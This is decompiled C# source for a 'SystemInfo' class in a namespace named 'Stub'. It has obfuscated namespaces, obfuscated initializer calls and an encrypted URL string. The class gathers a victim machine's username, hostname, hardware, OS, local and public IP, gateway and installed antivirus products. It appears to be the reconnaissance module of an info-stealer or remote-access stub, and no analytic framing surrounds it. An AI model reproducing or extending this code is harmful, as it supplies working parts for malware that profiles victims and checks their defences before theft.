using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000B9 RID: 185
	internal sealed class SystemInfo
	{
		// Token: 0x17000022 RID: 34
		// (get) Token: 0x060002B1 RID: 689 RVA: 0x00004043 File Offset: 0x00002243
		public static string Username
		{
			get
			{
				return Environment.UserName;
			}
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x060002B2 RID: 690 RVA: 0x0000404A File Offset: 0x0000224A
		public static string Compname
		{
			get
			{
				return Environment.MachineName;
			}
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x060002B3 RID: 691 RVA: 0x00004051 File Offset: 0x00002251
		public static string Culture
		{
			get
			{
				return CultureInfo.CurrentCulture.ToString();
			}
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x0001A3F8 File Offset: 0x000185F8
		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			return string.Format("{0}x{1}", bounds.Width, bounds.Height);
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x0001A434 File Offset: 0x00018634
		public static string GetBattery()
		{
			string text2;
			try
			{
				string text = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
				text2 = text + " (" + (SystemInformation.PowerStatus.BatteryLifePercent * 100f).ToString(CultureInfo.InvariantCulture) + "%)";
			}
			catch
			{
				text2 = "Unknown";
			}
			return text2;
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x0001A4A8 File Offset: 0x000186A8
		private static string GetWindowsVersionName()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM win32_operatingsystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)enumerator.Current;
							return managementObject["Name"].ToString().Split(new char[] { '|' })[0].Trim();
						}
					}
				}
			}
			catch
			{
				return "Unknown System";
			}
			return "Unknown System";
		}

		// Token: 0x060002B7 RID: 695 RVA: 0x0001A564 File Offset: 0x00018764
		private static string GetBitVersion()
		{
			string text3;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0");
				string text;
				if (registryKey == null)
				{
					text = null;
				}
				else
				{
					object value = registryKey.GetValue("Identifier");
					text = ((value != null) ? value.ToString() : null);
				}
				string text2 = text;
				text3 = ((text2 == null || !text2.Contains("x86")) ? "(64 Bit)" : "(32 Bit)");
			}
			catch
			{
				text3 = "(Unknown)";
			}
			return text3;
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x0001A5D8 File Offset: 0x000187D8
		public static string GetSystemVersion()
		{
			return SystemInfo.GetWindowsVersionName() + " " + SystemInfo.GetBitVersion();
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x0001A5FC File Offset: 0x000187FC
		public static string GetDefaultGateway()
		{
			string text;
			try
			{
				text = (from n in NetworkInterface.GetAllNetworkInterfaces()
					where n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback
					select n).SelectMany((NetworkInterface n) => n.GetIPProperties().GatewayAddresses).Select(delegate(GatewayIPAddressInformation g)
				{
					string text2;
					if (g == null)
					{
						text2 = null;
					}
					else
					{
						IPAddress address = g.Address;
						text2 = ((address != null) ? address.ToString() : null);
					}
					return text2;
				}).FirstOrDefault<string>() ?? "Unknown";
			}
			catch
			{
				text = "Unknown";
			}
			return text;
		}

		// Token: 0x060002BA RID: 698 RVA: 0x0001A6A8 File Offset: 0x000188A8
		public static string GetAntivirus()
		{
			string text;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = (from ManagementObject result in managementObjectSearcher.Get()
						select result["displayName"].ToString()).ToList<string>();
					text = ((list.Count > 0) ? string.Join(", ", list) : "Not installed");
				}
			}
			catch
			{
				text = "N/A";
			}
			return text;
		}

		// Token: 0x060002BB RID: 699 RVA: 0x0001A74C File Offset: 0x0001894C
		public static string GetLocalIp()
		{
			string text2;
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				IPAddress ipaddress = hostEntry.AddressList.FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork);
				string text;
				if (ipaddress != null)
				{
					if ((text = ipaddress.ToString()) != null)
					{
						goto IL_004B;
					}
				}
				text = "No network adapters with an IPv4 address in the system!";
				IL_004B:
				text2 = text;
			}
			catch
			{
				text2 = "No network adapters with an IPv4 address in the system!";
			}
			return text2;
		}

		// Token: 0x060002BC RID: 700 RVA: 0x0001A7C4 File Offset: 0x000189C4
		public static async Task<string> GetPublicIpAsync()
		{
			string text2;
			try
			{
				using (HttpClient client = new HttpClient())
				{
					string url = StringsCrypt.Decrypt(new byte[]
					{
						23, 61, 220, 157, 111, 249, 43, 180, 122, 28,
						107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
						238, 56, 3, 133, 224, 68, 195, 226, 41, 226,
						22, 191
					});
					string text = await client.GetStringAsync(url).ConfigureAwait(false);
					string externalIp = text;
					text = null;
					text2 = externalIp.Trim();
				}
			}
			catch (Exception ex)
			{
				string text3 = "SystemInfo >> GetPublicIP : Request error\n";
				Exception ex2 = ex;
				Logging.Log(text3 + ((ex2 != null) ? ex2.ToString() : null), true);
				text2 = "Request failed";
			}
			return text2;
		}

		// Token: 0x060002BD RID: 701 RVA: 0x0001A804 File Offset: 0x00018A04
		public static string GetCpuName()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementBaseObject managementBaseObject = enumerator.Current;
							object obj = managementBaseObject["Name"];
							string text;
							if (obj != null)
							{
								if ((text = obj.ToString()) != null)
								{
									goto IL_004E;
								}
							}
							text = "Unknown";
							IL_004E:
							return text;
						}
					}
				}
			}
			catch
			{
				return "Unknown";
			}
			return "Unknown";
		}

		// Token: 0x060002BE RID: 702 RVA: 0x0001A8B4 File Offset: 0x00018AB4
		public static string GetGpuName()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementBaseObject managementBaseObject = enumerator.Current;
							object obj = managementBaseObject["Name"];
							string text;
							if (obj != null)
							{
								if ((text = obj.ToString()) != null)
								{
									goto IL_004E;
								}
							}
							text = "Unknown";
							IL_004E:
							return text;
						}
					}
				}
			}
			catch
			{
				return "Unknown";
			}
			return "Unknown";
		}

		// Token: 0x060002BF RID: 703 RVA: 0x0001A964 File Offset: 0x00018B64
		public static string GetRamAmount()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementBaseObject managementBaseObject = enumerator.Current;
							double num = Convert.ToDouble(managementBaseObject["TotalPhysicalMemory"]);
							return string.Format("{0}MB", (int)(num / 1048576.0));
						}
					}
				}
			}
			catch
			{
				return "-1";
			}
			return "-1";
		}

		// Token: 0x060002C0 RID: 704 RVA: 0x000038B4 File Offset: 0x00001AB4
		public SystemInfo()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060002C1 RID: 705 RVA: 0x0001AA20 File Offset: 0x00018C20
		static SystemInfo()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			SystemInfo.Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");
		}

		// Token: 0x04000573 RID: 1395
		public static readonly string Datenow;
	}
}
